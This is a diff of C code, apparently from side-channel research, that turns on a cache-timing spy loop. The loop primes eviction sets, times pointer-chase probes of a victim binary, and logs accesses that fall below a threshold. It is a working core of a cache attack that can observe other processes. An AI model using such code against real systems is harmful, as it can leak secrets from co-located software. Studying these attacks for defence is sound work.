@@ -68,40 +68,38 @@ void my_monitor(){
     unsigned long long old_tsc, tsc = rdtsc();
     probe_chase_loop(victim_copy, 1);
     probe_chase_loop(victim, 1);
-    // probe_evset_chase(*spy_evsets);
-    // probe_evset_chase(*spy_evsets);
+    probe_evset_chase(*spy_evsets);
+    probe_evset_chase(*spy_evsets);
     // void *my_victim = map("./build/victim", 0x11a8);
 
-    flush(victim);
-    flush(victim_copy);
 
     int timing1 = probe_chase_loop(victim, 1);
     int timing2 = probe_chase_loop(victim, 1);
-    flush(victim);
+    probe_evset_chase(*spy_evsets);
     int timing3 = probe_chase_loop(victim_copy, 1);
     int timing4 = probe_chase_loop(victim, 1);
 
     printf("%d %d %d %d\n", timing1, timing2, timing3, timing4);
-    // while(1)
-    // {
-    //     probe_chase_loop(victim_copy, 1);
-    //     old_tsc = tsc;
-    //     tsc=rdtsc();
-    //     while (tsc - old_tsc < 2500) // TODO why 2500/500 cycles per slot now, depending on printf
-    //     {
-    //         tsc = rdtsc();
-    //     }
-    //     msrmts_spy[ctr]= probe_chase_loop(victim, 1);
-    //     evset_probetime = probe_evset_chase(*spy_evsets);
-    //     if(msrmts_spy[ctr] < conf->threshold) {
-    //         printf("[!] my_monitor: victim acitivity detected! cycles %lu, ctr %d, evset_probetime %lu\n", msrmts_spy[ctr], ctr, evset_probetime);
-    //     }
-    //     ctr++;
-    //     if(ctr >= 1000000) ctr=0;
-    // }
+    while(1)
+    {
+        old_tsc = tsc;
+        tsc=rdtsc();
+        while (tsc - old_tsc < 2500) // TODO why 2500/500 cycles per slot now, depending on printf
+        {
+            tsc = rdtsc();
+        }
+        msrmts_spy[ctr]= probe_chase_loop(victim, 1);
+        probe_evset_chase(*spy_evsets);
+        evset_probetime = probe_evset_chase(*spy_evsets);
+        if(msrmts_spy[ctr] < conf->threshold) {
+            printf("[!] my_monitor: victim acitivity detected! cycles %lu, ctr %d, evset_probetime %lu\n", msrmts_spy[ctr], ctr, evset_probetime);
+        }
+        ctr++;
+        if(ctr >= 1000000) ctr=0;
+    }
     
-    // for(int i=0;i<100000;i++) printf("%lu; ", msrmts_spy[i]);
-    // printf("\n ctr %d \n", ctr);
+    for(int i=0;i<100000;i++) printf("%lu; ", msrmts_spy[i]);
+    printf("\n ctr %d \n", ctr);
 }
 
 void spy(char *victim_filepath, int offset_target){
